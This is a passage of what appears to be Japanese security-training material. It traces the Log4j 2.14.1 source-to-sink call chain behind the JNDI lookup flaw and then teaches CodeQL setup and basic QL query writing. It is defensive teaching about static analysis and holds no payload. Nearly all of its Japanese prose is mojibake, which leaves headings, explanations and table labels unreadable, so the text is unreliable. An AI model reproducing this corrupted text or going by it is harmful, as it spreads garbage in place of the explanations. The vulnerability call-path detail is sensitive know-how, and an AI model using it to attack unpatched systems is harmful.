            final Throwable throwable) {
        logMessageSafely(fqcn, level, marker, messageFactory.newMessage(message), throwable);
    }
```

```java
    protected void logMessage(final String fqcn, final Level level, final Marker marker, final CharSequence message,
            final Throwable throwable) {
        logMessageSafely(fqcn, level, marker, messageFactory.newMessage(message), throwable);
    }
```

ã©ã‚“ã©ã‚“æ˜ã£ã¦ã„ãã¨ä»¥ä¸‹ã®ãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚ã‚Šæ›´ã«ãƒ¡ã‚½ãƒƒãƒ‰ãŒå‘¼ã³å‡ºã•ã‚Œã¦...ã¨ãªã‚‹
å¾Œã®partã§è‡ªåˆ†ã§ã‚½ãƒ¼ã‚¹ã€ã‚·ãƒ³ã‚¯ã‚’è‡ªåˆ†ã§è¾¿ã‚‹ã®ã§ã€ä»Šã¯ã‚·ãƒ³ã‚¯ã¨ã‚½ãƒ¼ã‚¹ã‚’ç°¡å˜ã«è¿½ã„ã‹ã‘ã‚‹ç¨‹åº¦ã«ã—ã¦ãŠã
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/config/LoggerConfig.java
```java
    @PerformanceSensitive("allocation")
    public void log(final String loggerName, final String fqcn, final Marker marker, final Level level,
            final Message data, final Throwable t) {
        List<Property> props = null;
        if (!propertiesRequireLookup) {
            props = properties;
        } else if (properties != null) {
            props = new ArrayList<>(properties.size());
            final LogEvent event = Log4jLogEvent.newBuilder()
                    .setMessage(data)
                    .setMarker(marker)
                    .setLevel(level)
                    .setLoggerName(loggerName)
                    .setLoggerFqcn(fqcn)
                    .setThrown(t)
                    .build();
            for (int i = 0; i < properties.size(); i++) {
                final Property prop = properties.get(i);
                final String value = prop.isValueNeedsLookup() // since LOG4J2-1575
                        ? config.getStrSubstitutor().replace(event, prop.getValue()) //
                        : prop.getValue();
                props.add(Property.createProperty(prop.getName(), value));
            }
        }
        final LogEvent logEvent = logEventFactory instanceof LocationAwareLogEventFactory ?
            ((LocationAwareLogEventFactory) logEventFactory).createEvent(loggerName, marker, fqcn, requiresLocation() ?
                StackLocatorUtil.calcLocation(fqcn) : null, level, data, props, t) :
            logEventFactory.createEvent(loggerName, marker, fqcn, level, data, props, t);
```

ä»¥ä¸‹ãŒã‚½ãƒ¼ã‚¹ã‹ã‚‰ã‚·ãƒ³ã‚¯ã¾ã§ã®å‘¼ã³å‡ºã—é †ã¨ãªã‚‹
```
AbstractLogger.java:1299 // source
AbstractLogger.java:1300
AbstractLogger.java:1857
AbstractLogger.java:1860
AbstractLogger.java:1987
AbstractLogger.java:1989
ReusableMessageFactory.java:92
ReusableMessageFactory.java:95
AbstractLogger.java:1989
AbstractLogger.java:2139
AbstractLogger.java:2142
AbstractLogger.java:2155
AbstractLogger.java:2159
AbstractLogger.java:2202
AbstractLogger.java:2205
Logger.java:158
Logger.java:162
AwaitCompletionReliabilityStrategy.java:78
AwaitCompletionReliabilityStrategy.java:82
LoggerConfig.java:430
LoggerConfig.java:454
ReusableLogEventFactory.java:78
ReusableLogEventFactory.java:111
LoggerConfig.java:453
LoggerConfig.java:456
LoggerConfig.java:479
LoggerConfig.java:481
LoggerConfig.java:495
LoggerConfig.java:498
LoggerConfig.java:536
LoggerConfig.java:540
AppenderControl.java:80
AppenderControl.java:84
AppenderControl.java:117
AppenderControl.java:120
AppenderControl.java:126
AppenderControl.java:129
AppenderControl.java:154
AppenderControl.java:156
RoutingAppender.java:222
RoutingAppender.java:227
StrSubstitutor.java:462
StrSubstitutor.java:467
StrSubstitutor.java:911
StrSubstitutor.java:912
StrSubstitutor.java:928
StrSubstitutor.java:978
StrSubstitutor.java:911
StrSubstitutor.java:912
StrSubstitutor.java:928
StrSubstitutor.java:1033
StrSubstitutor.java:1104
StrSubstitutor.java:1110
EventLookup.java:35
EventLookup.java:41
MutableLogEvent.java:407
MutableLogEvent.java:408
EventLookup.java:41
StrSubstitutor.java:1110
StrSubstitutor.java:1033
StrSubstitutor.java:1040
StrSubstitutor.java:1040
StrSubstitutor.java:912
StrSubstitutor.java:978
StrSubstitutor.java:979
StrSubstitutor.java:979
StrSubstitutor.java:1033
StrSubstitutor.java:1104
StrSubstitutor.java:1110
JndiLookup.java:50
JndiLookup.java:54
JndiLookup.java:70
JndiLookup.java:72
JndiLookup.java:54
JndiLookup.java:56
JndiManager.java:171
JndiManager.java:172 // sink
```


---
# ã€œä¼‘æ†©ã€œ
---

# CodeQLã§è„†å¼±æ€§èª¿æŸ»ã‚’è‡ªå‹•åŒ–ï¼

Q. Taint Trackingã£ã¦æ‰‹å‹•ã§ã‚„ã‚‰ãªãã¦ã‚‚æ©Ÿæ¢°çš„ã«ã§ãã‚‹ã‚“ã˜ã‚ƒ...?
A. ã¯ã„

(ç¾å®Ÿçš„ã«ã¯ã‚³ãƒ¼ãƒ‰ã®æµã‚Œã‚’ã¡ã‚ƒã‚“ã¨è¿½ãˆã‚‹ã‹ã€sourceã‚„sinkã®å®šç¾©ã®æ›´æ–°ã€sourceã®validationã‚„sanitizeãªã©ã®å‡¦ç†ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œã‚‹ã‹ç­‰ã®å•é¡Œã¯ã‚ã‚‹ã€‚)

Taint Trackingã®ãƒ«ãƒ¼ãƒ«ãŒã‹ã‘ã‚‹ä»£è¡¨çš„ãªSASTï¼ˆStatic Application Security Testingï¼‰ãƒ„ãƒ¼ãƒ«

- CodeQL
    - ä»Šå›åˆ©ç”¨ã—ã¾ã™
- Semgrep
    - Proãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆæœ‰æ–™ï¼‰ã ã¨Taint Trackingãƒ«ãƒ¼ãƒ«ãŒã‹ã‘ã‚‹

å®Ÿéš›ã«ã‚„ã£ã¦ã¿ã‚ˆã†

## CodeQL

GitHubç¤¾ã®æä¾›ã™ã‚‹SASTãƒ„ãƒ¼ãƒ«
æ­´å²çš„ã«ã¯Semmleç¤¾ã‹ã‚‰GitHubãŒè²·åã—ãŸè£½å“ã€‚

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½œæˆã—ã¦ã€ãã‚Œã«å¯¾ã—ã¦ã‚¯ã‚¨ãƒªã‚’æŠ•ã’ã¦æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãƒ„ãƒ¼ãƒ«ã€‚
ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ç”¨ã ã‘ã©ã€ãã‚Œä»¥å¤–ã«ã‚‚åˆ©ç”¨å¯èƒ½ã€‚
å¯¾å¿œè¨€èªã¯ C, C++, C#, Go, Java, Kotlin, JavaScript, TypeScript, Python, Ruby, Swift

ãƒªãƒã‚¸ãƒˆãƒªã®Settings -> Code security and analysisã‹ã‚‰æœ‰åŠ¹ã«ã§ãã‚‹ã€‚
â€»ãŸã ã—å…¬é–‹ãƒªãƒã‚¸ãƒˆãƒªã®ã¿ã€‚Privateãƒªãƒã‚¸ãƒˆãƒªã§ã¯GitHub Enterprise + GitHub Advanced Securityã‚’å¥‘ç´„ã—ãªã„ã¨è¦ç´„ä¸Šåˆ©ç”¨ã§ããªã„ã€‚ä¸€éƒ¨ã®ã‚³ãƒ¼ãƒ‰ã¯OSSã˜ã‚ƒãªã„ã€‚

![](https://tyage.github.io/seccamp-2023-images/upload_fab6187bfd6436534168622d26e8a43f.png)

è„†å¼±æ€§ãŒè¦‹ã¤ã‹ã‚‹ã¨ã“ã‚“ãªæ„Ÿã˜ã«æ•™ãˆã¦ãã‚Œã‚‹ã€‚

![](https://tyage.github.io/seccamp-2023-images/upload_8f06f9989cfdacf49a01733bf8dc450e.png)

æ¤œçŸ¥ãƒ«ãƒ¼ãƒ«ã‚’æ›¸ã„ãŸã‚ã¨ã€GitHubä¸Šã®ä¸Šä½1000å€‹ã®ãƒªãƒã‚¸ãƒˆãƒªã§æ¤œçŸ¥ã‚’è¡Œã†æ©Ÿèƒ½ãŒæä¾›ã•ã‚Œã¦ãŠã‚Šã€è‡ªä½œã®æ¤œçŸ¥ãƒ­ã‚¸ãƒƒã‚¯ã®æ¤œè¨¼ã‚„BugBountyã«ä¾¿åˆ©ã€‚
(GitHubæä¾›ã®ä½œæˆæ¸ˆã¿ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã—ã¦ã‚¯ã‚¨ãƒªã‚’èµ°ã‚‰ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã®ã§ã€è‡ªåˆ†ã§ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½œã‚‰ãªãã¦ã‚ˆãã¦ä¾¿åˆ©)

![](https://tyage.github.io/seccamp-2023-images/upload_23a3220ac1c234de2d1ffc817525ee55.png)

### BugBountyğŸ’°ğŸ’°ğŸ’°

CodeQLã®ãƒ«ãƒ¼ãƒ«ã¯ä¸»ã«GitHubï¼ˆã‚„è²·åã•ã‚ŒãŸSemmleç¤¾ï¼‰ã®äººã€…ãŒæ›¸ã„ãŸã‚‚ã®ã§ã™ãŒã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§ã‚‚è²¢çŒ®ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
(CodeQLã‚’æ”¹å–„ã™ã‚‹ã¨ä¸–ç•Œä¸­ã®GitHubä¸Šã®ã‚³ãƒ¼ãƒ‰ã§è‡ªå‹•çš„ã«è„†å¼±æ€§ãŒè¦‹ã¤ã‹ã‚‹ã‹ã‚‚...?)

[BugBountyãƒ—ãƒ­ã‚°ãƒ©ãƒ ](https://securitylab.github.com/bounties/)ãŒã‚ã‚Šã€2ç¨®é¡ã®ã©ã¡ã‚‰ã‹ã‚’ã‚„ã‚‹ã¨ãŠé‡‘ãŒã‚‚ã‚‰ãˆã¾ã™ğŸ’°ğŸ’°ğŸ’°

- CVEã«ãªã£ã¦ã‚‹è„†å¼±æ€§ã‚’æ¤œçŸ¥ã§ãã‚‹ã‚ˆã†ã«CodeQLã‚’ã„ã„æ„Ÿã˜ã«æ”¹å–„
- CodeQLã‚’ä½¿ã£ã¦è„†å¼±æ€§è¦‹ã¤ã‘ã¦CVEã‚’è¤‡æ•°ç²å¾—

æ°—å‰ã‚ˆã $1000 ~ $6000 ã®ç¯„å›²ã§æ”¯æ‰•ã‚ã‚Œã¦ã„ã‚‹ã®ã§ã‚ªã‚¹ã‚¹ãƒ¡ã€‚
ï¼ˆç§ã‚‚ã“ã®å‰ã¡ã‚‡ã£ã¨ã‚‚ã‚‰ã£ãŸï¼‰

æ”¯æ‰•ã„ã®æ§˜å­: https://hackerone.com/github-security-lab/hacktivity

## CodeQLã‚¯ã‚¨ãƒªã‚’æ›¸ã„ã¦ã¿ã‚ˆã†

CodeQLã§ã¯QLã¨ã„ã†è¨€èªã§ã‚¯ã‚¨ãƒªã‚’è¨˜è¿°ã—ã¾ã™ã€‚
(ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹æ¤œç´¢ã‚¯ã‚¨ãƒªãªã®ã§ã€SQLã®ã‚¤ãƒ¡ãƒ¼ã‚¸ãŒè¿‘ã„ã‹ã‚‚)

### (äº‹å‰èª²é¡Œ) ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—

VS Codeæ‹¡å¼µã‚’ä»Šå›ã¯åˆ©ç”¨ã—ã¾ã™ã€‚

[Setting up CodeQL in Visual Studio Code](https://codeql.github.com/docs/codeql-for-visual-studio-code/setting-up-codeql-in-visual-studio-code/)

Step1. VS Codeã«CodeQL Extensionã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«
https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql
![](https://tyage.github.io/seccamp-2023-images/upload_52ad5dac9514a674b594138655adec5e.png)

Step2. vscode-codeql-starter ãƒªãƒã‚¸ãƒˆãƒªã‚’ git clone

```
$ git clone https://github.com/github/vscode-codeql-starter
```

Step3. ãƒªãƒã‚¸ãƒˆãƒªã®submoduleã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰

```
$ cd vscode-codeql-starter
$ git submodule update --init --remote
```

Step4. VS Codeã§`File > Open Workspace` ã‹ã‚‰ãƒ•ã‚©ãƒ«ãƒ€å†…ã® `vscode-codeql-starter.code-workspace` ã‚’é¸æŠ
(æ—¥æœ¬èªã ã¨ `ãƒ•ã‚¡ã‚¤ãƒ« > ãƒ•ã‚¡ã‚¤ãƒ«ã§ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒšãƒ¼ã‚¹ã‚’é–‹ã`)

Step5. CodeQL CLIãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ãªã„å ´åˆã€é©å½“ã« `example.ql` ã¨ã‹ã‚’é–‹ãã¨ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãŒå§‹ã¾ã‚‹
(Linux arm64ç’°å¢ƒã®äººã¯é™ã£ã¦ãã‚‹Javaã‚’å·®ã—æ›¿ãˆã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚...)

Step6. VS Code Command `CodeQL: Install Pack Dependencies` ã‚’å®Ÿè¡Œã—ã¦ã€CodeQLã®å…¬å¼ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«
![](https://tyage.github.io/seccamp-2023-images/upload_8a686f0a4f930166304abfa309dcba66.png)
![](https://tyage.github.io/seccamp-2023-images/upload_85f9a9ab7c5e7033a3e3c08c954f1581.png)

Step7. `codeql-custom-queries-javascript/example.ql` ç­‰ã‚’é–‹ã„ã¦ã‚¨ãƒ©ãƒ¼ãŒèµ·ãã¦ã„ã‚‹å ´åˆã«ã¯ VS Code Command `Reload Window` ã‚’å®Ÿè¡Œ

![](https://tyage.github.io/seccamp-2023-images/upload_72e3969fe3394f659733f4a87620be52.png)

ã“ã‚Œã§ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã¯å®Œäº†ã§ã™ï¼

### (äº‹å‰èª²é¡Œ) ã‚¯ã‚¨ãƒªã‚’è©¦ã—ã¦ã¿ã‚‹

å®Ÿéš›ã«CodeQLã§ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã§æ¤œç´¢ãŒè¡Œãˆã‚‹ã‹è©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã“ã“ã§ã¯è©¦ã—ã«ã€nanoidã¨ã„ã†å°ã•ã„ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’åˆ©ç”¨ã—ã¦ã€ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ã¦ã¿ã¾ã™
nanoid: ãƒ©ãƒ³ãƒ€ãƒ ãªIDã‚’ç”Ÿæˆã™ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒª

Step1. ã‚µã‚¤ãƒ‰ãƒãƒ¼ã®CodeQLæ‹¡å¼µã‚’é¸æŠã—ã€ã€€ `DATABASES > From GitHub` ã§ `https://github.com/ai/nanoid` ã‚’å…¥åŠ›ã—ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰

![](https://tyage.github.io/seccamp-2023-images/upload_46df08d4961d6e92fd84d626654e208c.png)

Step2. `codeql-custom-queries-javascript` ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒšãƒ¼ã‚¹ã« `test.ql` ã‚’ä½œæˆ

test.ql
```javascript
select "hello world"
```

Step3. VS Code Command `CodeQL: Run Query on Selected Database` ã‚’å®Ÿè¡Œ

Step4. `hello world` ãŒ `CodeQL Query Results` ã«è¡¨ç¤ºã•ã‚Œã‚‹

![](https://tyage.github.io/seccamp-2023-images/upload_8601c2c3114c916847050d665f34af4e.png)

Step5. `test.ql` ã‚’æ›¸ãæ›ãˆ

test.ql
```javascript
import javascript

from MethodCallExpr e
where e.getMethodName() = "allocUnsafe"
select e, "allocUnsafe method call"
```

Step6. å®Ÿè¡Œã™ã‚‹ã¨ `allocUnsafe` ãƒ¡ã‚½ãƒƒãƒ‰ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ç®‡æ‰€ãŒè¡¨ç¤ºã•ã‚Œã¾ã™

![](https://tyage.github.io/seccamp-2023-images/upload_684f3193cfb87794c2c042a5b944a573.png)

ä½™è£•ãŒã‚ã‚‹äººã¯ `https://github.com/misskey-dev/misskey` ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’è¿½åŠ ã—ã¦ `codeql-custom-queries-javascript/example.ql` ã‚’å®Ÿè¡Œã—ã¦ã¿ã¦ãã ã•ã„ã€‚

Misskeyã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ä¸­ã§ã€å®Ÿè¡Œã™ã‚‹ã‚‚ã®ãŒãªã„ç©ºã®ãƒ–ãƒ­ãƒƒã‚¯ï¼ˆ`{}`ï¼‰ãŒã‚ã‚‹ã‹æ¤œç´¢ã§ãã¾ã™ã€‚

### ã†ã¾ãå‹•ã‹ãªã‹ã£ãŸæ™‚

æ‰‹å…ƒã®ãƒã‚·ãƒ³ã§ãƒ¡ãƒ¢ãƒªä¸è¶³ãªã©ãŒåŸå› ã§å‹•ä½œã—ãªã„ã€å‹•ä½œãŒé…ã„ã¨ãã¯GitHub Codespacesä¸Šã§ä½œæ¥­ã‚’ãŠé¡˜ã„ã—ã¾ã™ã€‚
ï¼ˆä¸å®‰ãªæ–¹ã¯æœ€åˆã‹ã‚‰ãã£ã¡ã§ã‚„ã£ã¦ã‚‚ã‚‰ã£ãŸã»ã†ãŒã„ã„ã‹ã‚‚ï¼‰

ãƒ“ãƒ«ãƒ‰æ¸ˆã¿ã®Codespacesã‚’ç”¨æ„ã—ã¦ã„ã¾ã™ã€‚
ä»¥ä¸‹ã®URLã‹ã‚‰èµ·å‹•ã™ã‚‹ã¨ã€ä¸Šè¨˜ã®æº–å‚™ã‚’å®Ÿæ–½æ¸ˆã¿ã®ç’°å¢ƒãŒãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§ç«‹ã¡ä¸ŠãŒã‚‹ã¯ãšã§ã™ã€‚
ï¼ˆâ€»è¬›ç¾©çµ‚äº†å¾Œã—ã°ã‚‰ãã—ãŸã‚‰Codespacesç’°å¢ƒã¯æ­¢ã¾ã‚‹ã¨æ€ã†ã®ã§ã”æ³¨æ„ã‚’ã€‚ï¼‰

è¿½è¨˜: Machine typeã¯8-coreä»¥ä¸Šæ¨å¥¨

https://github.com/codespaces/new?skip_quickstart=true&machine=premiumLinux&repo=675891091&ref=main&geo=SoutheastAsia&devcontainer_path=.devcontainer%2Fdevcontainer.json

### CodeQLã‚¯ã‚¨ãƒªã®åŸºç¤

å…¬å¼ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«: [Introduction to QL](https://codeql.github.com/docs/writing-codeql-queries/introduction-to-ql/)

CodeQLã®ã‚¯ã‚¨ãƒªã¯ `select "hello world"` ã®ã‚ˆã†ã«SQLã«è¿‘ã„è¦‹ãŸç›®ã‚’ã—ã¦ã„ã¾ã™ãŒã€å¤‰æ•°å®£è¨€ã‚„ã‚¯ãƒ©ã‚¹ã€ã‚¯ãƒ©ã‚¹ã®ç¶™æ‰¿ãªã©ãŒã‚ã‚Šãã†ã„ã£ãŸé¢ã§ã¯ä¸€èˆ¬çš„ãªãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã«è¿‘ã„ã§ã™ã€‚

ã‚¯ã‚¨ãƒªã®åŸºæœ¬å½¢

```javascript
from /* ... å¤‰æ•°å®£è¨€ ... */
where /* ... æ¡ä»¶ ... */
select /* ... è©•ä¾¡å¼ ... */
```

6*7 ã‚’è¨ˆç®—ã™ã‚‹ã‚¯ã‚¨ãƒª

```javascript
from int x, int y // å¤‰æ•°x, yã‚’å®£è¨€ã€‚ãã‚Œãã‚Œintå‹
where x = 6 and y = 7 // x, yã®æ¡ä»¶ã‚’è¨­å®š
select x, y, x * y // x*y ã‚’è¨ˆç®—ã—ã¦å‡ºåŠ›
```

`where` ã§ä»£å…¥ã®ã‚ˆã†ãªã“ã¨ã‚’ã—ã¦ã„ã‚‹ã‚ˆã†ã«è¦‹ãˆã‚‹ã®ã§å°‘ã—ä¸æ€è­°ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
å®Ÿéš›ã«ã¯ã€`where` ãŒãªã„çŠ¶æ…‹ã§ã¯ `x` ã¯ `int` ã®å–ã‚Šã†ã‚‹ä»»æ„ã®å€¤(... -1, 0, 1, 2, ...)ã‚’è¡¨ã—ã¦ãŠã‚Šã€ `where x = 6` ã§ `x` ã‚’6ã«æŸç¸›ã™ã‚‹ã¨ã„ã†ã‚¤ãƒ¡ãƒ¼ã‚¸ã§ã™ã€‚

`x` ã‚’è¤‡æ•°ã®å€¤ã«æŸç¸›ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

1\*7, 3\*7, 5\*7, 7\*7 ã‚’è¨ˆç®—ã™ã‚‹ã‚¯ã‚¨ãƒª
Pythonã§æ›¸ã‘ã°ã“ã‚“ãªã‚¤ãƒ¡ãƒ¼ã‚¸ï¼Ÿ `[x*y for x in [1,3,5,7] for y in [7]]`

```javascript
from int x, int y
where x in [1, 3, 5, 7] and y = 7
select x, y, x * y
```

`x = y` ã®ã‚ˆã†ã«å¤‰æ•°åŒå£«ã‚’æŸç¸›ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
ä¸‹ã§ã¯ 1\*1 ã¨ 3\*3 ãŒè¨ˆç®—ã•ã‚Œã¾ã™ã€‚

```javascript
from int x, int y
where x in [1, 3, 5, 7] and y in [1, 2, 3] and x = y
select x, y, x * y
```

ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¯ã‚¨ãƒªã¯å®Ÿè¡Œã§ãã¾ã›ã‚“ã€‚xãŒç„¡é™ã«ã‚ã‚‹ãŸã‚ã€‚

```javascript
from int x, int y
where y = 7
select x, y, x * y
```

classã‚’å®šç¾©ã™ã‚‹ã“ã¨ã§ã€ãã‚ŒãŒå‹ã«ãªã‚Šã¾ã™ã€‚ã¾ãŸã€int, string, booleanã®ã‚ˆã†ãªprimitiveãªå‹ã‚’ç¶™æ‰¿ã—ãŸclassã‚’ä½œã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

```javascript
class OneTwoThree extends int {
  OneTwoThree() { this = [1 .. 3] }
}

from OneTwoThree num
select num
```

CodeQLã§åˆ©ç”¨ã§ãã‚‹æ¼”ç®—å­ã‚„æ§‹æ–‡ã‚’ã„ãã¤ã‹ãƒ”ãƒƒã‚¯ã‚¢ãƒƒãƒ—ã—ã¦ã¿ã¾ã—ãŸã€‚


|            | ä¾‹                   | è§£èª¬              |
| ---------- | -------------------- | ----------------- |
| <          | A < B                | æ¯”è¼ƒæ¼”ç®—å­        |
| >          | A > B                | æ¯”è¼ƒæ¼”ç®—å­        |
| <=         | A <= B               | æ¯”è¼ƒæ¼”ç®—å­        |
| >=         | A >= B               | æ¯”è¼ƒæ¼”ç®—å­        |
| =          | A = B                | æ¯”è¼ƒæ¼”ç®—å­        |
| !=         | A != B               | æ¯”è¼ƒæ¼”ç®—å­        |
| instanceof | A instanceof TYPE    | A ã®å‹ãŒ TYPE     |
| in         | A in RANGE           | A ãŒ RANGE ã®ç¯„å›² |
| not        | not A                | æ¡ä»¶å¦å®š          |
| and        | A and B              | è«–ç†ç©            |
| or         | A or B               | è«–ç†å’Œ            |
| if         | if A then B else C   | æ¡ä»¶æ–‡            |
| class      | class A extends B {} | ã‚¯ãƒ©ã‚¹å®šç¾©        |

(ã¡ãªã¿ã«å°‘ã—ã‚„ã‚„ã“ã—ã„ã“ã¨ã« `not A = B` ã¨ `A != B` ã§æ„å‘³ãŒé•ã„ã¾ã™...)

ãã®ä»–ã€CodeQLç‰¹æœ‰ã®è¨€èªä»•æ§˜ã¯[QL language reference](https://codeql.github.com/docs/ql-language-reference/)ã‚’å‚ç…§ã™ã‚‹ã¨ã‚ˆã„ã§ã™ã€‚

### ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã«å¯¾ã™ã‚‹ã‚¯ã‚¨ãƒª

äº‹å‰æº–å‚™ã§ä½¿ç”¨ã—ãŸã‚¯ã‚¨ãƒªã«æˆ»ã£ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```javascript
import javascript

from MethodCallExpr e
where e.getMethodName() = "allocUnsafe"
select e, "allocUnsafe method call"
```

CodeQLã‚¯ã‚¨ãƒªã«ã¤ã„ã¦ã®è§£åƒåº¦ã¯ãªã‚“ã¨ãªãä¸ŠãŒã£ãŸã‹ã¨æ€ã†ã®ã§ã™ãŒã€ã¾ã åˆ†ã‹ã‚‰ãªã„ç®‡æ‰€ãŒã„ãã¤ã‹ã‚ã‚‹ã¨æ€ã„ã¾ã™ã€‚
ä¸€ã¤ãšã¤è§£èª¬ã—ã¾ã™ã€‚

#### `import javascript`

CodeQLã§ã¯ã€è¨€èªã”ã¨ã«ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒç”¨æ„ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ã‚¯ã‚¨ãƒªã‚’æ›¸ãå ´åˆã¯ãã‚Œã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚
(äº‹å‰èª²é¡Œã§ã€`CodeQL: Install Pack Dependencies` ã¨ã„ã†ã‚³ãƒãƒ³ãƒ‰ã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ãŸã®ãŒã€ãã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã™ã€‚)

`import javascript` ã«ã‚ˆã£ã¦ã€CodeQLã®JavaScript + TypeScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

å…¬å¼è¨€èªåˆ¥ã‚¬ã‚¤ãƒ‰: [CodeQL language guides](https://codeql.github.com/docs/codeql-language-guides/)

çµæœã¨ã—ã¦ã€ã‚¯ã‚¨ãƒªã‚‚è¨€èªåˆ¥ã«æ›¸ãã“ã¨ã«ãªã‚Šã¾ã™ã€‚
ã¾ãŸã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚‚è¨€èªã”ã¨ã«ç”Ÿæˆã•ã‚Œã¦ã„ã¾ã™ã€‚ï¼ˆä¸€ã¤ã®ãƒªãƒã‚¸ãƒˆãƒªã§è¨€èªåˆ¥ã«è¤‡æ•°ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚ï¼‰

#### `from MethodCallExpr e`

CodeQLã§ã¯ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®æŠ½è±¡æ§‹æ–‡æœ¨(AST)ã¨ã„ã†ãƒ„ãƒªãƒ¼ã‚’ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ä¿ç®¡ã—ã¦ã„ã¾ã™ã€‚
(ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã®ãƒ‘ãƒ¼ã‚µã‚„ã‚³ãƒ³ãƒ‘ã‚¤ãƒ©ã‚’æ›¸ã„ãŸã“ã¨ãŒã‚ã‚‹äººã¯è§¦ã‚ŒãŸã“ã¨ãŒã‚ã‚‹ã¯ãš)
CodeQLã‚¯ã‚¨ãƒªã‚’æ›¸ãã¨ãã¯ã€ASTã®å„ãƒãƒ¼ãƒ‰ã‚„ã€ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒãƒ¼ãƒ‰ã¸ã®ãƒ‘ã‚¹ã‚’æ¢ç´¢ã—ã¦ã„ãã¾ã™ã€‚

ASTã¯ã™ã”ãå¤§é›‘æŠŠã«è¨€ãˆã°ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®æ–‡æ³•è¡¨ç¾ã‚’æœ¨æ§‹é€ ã«è½ã¨ã—ãŸã‚‚ã®ã§ã™ãŒã€å®Ÿéš›ã«è¦‹ãŸã»ã†ãŒåˆ†ã‹ã‚Šã‚„ã™ã„ã¨æ€ã†ã®ã§è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

VSCodeã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ãƒ¼ãƒ©ã‹ã‚‰ ai/nanoidã€€ã® index.js ã«å¯¾ã—ã¦å³ã‚¯ãƒªãƒƒã‚¯ > CodeQL: View ASTã‚’å®Ÿè¡Œã™ã‚‹ã¨ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ASTãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
(åˆå›ã¯å®Ÿè¡Œã«æ™‚é–“ã‹ã‹ã‚‹ã‹ã‚‚)

![](https://tyage.github.io/seccamp-2023-images/upload_97a5329e01fb86643ef199503096a925.png)

![](https://tyage.github.io/seccamp-2023-images/upload_bb68ce29639def1f4e28a7cfa6cf4ce3.png)

